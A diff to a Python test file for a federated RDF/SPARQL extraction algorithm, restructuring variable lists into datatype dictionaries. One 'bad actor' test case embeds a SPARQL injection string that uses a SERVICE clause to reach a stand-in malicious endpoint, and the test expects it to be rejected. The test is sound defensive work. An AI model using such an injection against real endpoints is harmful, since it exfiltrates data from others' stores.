@@ -105,26 +105,39 @@ def test_configurations(rdf_store):
     return {
         "standard_dataset": {
             "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
-            "variables_to_extract": ["ncit:C28421", "ncit:C156420"],
+            "variables_to_extract": {
+                "ncit:C28421": {
+                    "datatype": "categorical",
+                },
+                "ncit:C156420": {
+                    "datatype": "numerical",
+                }
+            },
             "query_type": "single_column",
         },
         "standard_dataset_bad_actor": {
             "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
-            "variables_to_extract": [
+            "variables_to_extract": {
                 "<http://example.org/predicate> UNION { SERVICE <http://malicious.endpoint/sparql> "
-                "{ SELECT ?data WHERE { ?s ?p ?data } } }",
-            ],
+                "{ SELECT ?data WHERE { ?s ?p ?data } } }": {
+                    "datatype": "categorical"
+                },
+            },
             "query_type": "single_column",
             "expected_failure": True,
             "failure_reason": "Invalid query injection.",
-            "expected_error_type": [UserInputError, AlgorithmError],
+            "expected_error_type": [UserInputError, AlgorithmError, ],
         },
         "standard_dataset_incorrect_input": {
             "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
-            "variables_to_extract": [
-                "Variable_1",
-                "ncit:C-does-not-exist",
-            ],  # Use a non-existent variable
+            "variables_to_extract": {
+                "Variable_1": {
+                    "datatype": "categorical"
+                },
+                "ncit:C-does-not-exist": {
+                    "datatype": "numerical"
+                },
+            },  # Use a non-existent variable
             "query_type": "single_column",
             "expected_failure": True,
             "failure_reason": "Non-existent variables requested or invalid input structure specified",
@@ -132,14 +145,23 @@ def test_configurations(rdf_store):
         },
         "standard_dataset_missing_variable_input": {
             "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
-            "variables_to_extract": [
-                "ncit:C0123456789",
-            ],  # Use a non-existent variable
+            "variables_to_extract": {
+                "ncit:C0123456789": {
+                    "datatype": "categorical"
+                },
+            },  # Use a non-existent variable
             "query_type": "single_column",
         },
         "non_existent_dataset_standard_input": {
             "database_label": "not_my_rdf_store",  # Use a non-existent database
-            "variables_to_extract": ["ncit:C28421", "ncit:C156420"],
+            "variables_to_extract": {
+                "ncit:C28421": {
+                    "datatype": "categorical",
+                },
+                "ncit:C156420": {
+                    "datatype": "numerical",
+                }
+            },
             "query_type": "single_column",
             "expected_failure": True,
             "failure_reason": "Attempting to query an unknown database",
@@ -202,13 +224,13 @@ class TestAlgorithmComponent:
         ],
     )
     def test_algorithm_basic(
-        self,
-        authentication,
-        algorithm_image_name,
-        test_configurations,
-        test_methods,
-        method,
-        config_name,
+            self,
+            authentication,
+            algorithm_image_name,
+            test_configurations,
+            test_methods,
+            method,
+            config_name,
     ):
         """
         Test algorithm with different methods and configurations, including expected failures.
@@ -354,7 +376,7 @@ def extract_data_from_result(client, task) -> List[pd.DataFrame]:
 
 
 def determine_result_acceptance(
-    federated_result: List[pd.DataFrame], algorithm_kwargs: Dict[str, Any] = None
+        federated_result: List[pd.DataFrame], algorithm_kwargs: Dict[str, Any] = None
 ) -> bool:
     """
     Validate that federated RDF extraction results meet expected criteria.
@@ -414,7 +436,7 @@ def determine_result_acceptance(
 
         # Validate each DataFrame
         for i, (result_df, expected_df) in enumerate(
-            zip(result_dataframes, expected_dataframes)
+                zip(result_dataframes, expected_dataframes)
         ):
             if not isinstance(result_df, pd.DataFrame):
                 print(f"Validation failed: Result {i} is not a DataFrame")
@@ -435,8 +457,8 @@ def determine_result_acceptance(
 
             # Check a sample of data values for key columns
             if (
-                "patient_id" in result_df.columns
-                and "patient_id" in expected_df.columns
+                    "patient_id" in result_df.columns
+                    and "patient_id" in expected_df.columns
             ):
                 if not result_df["patient_id"].equals(expected_df["patient_id"]):
                     print(
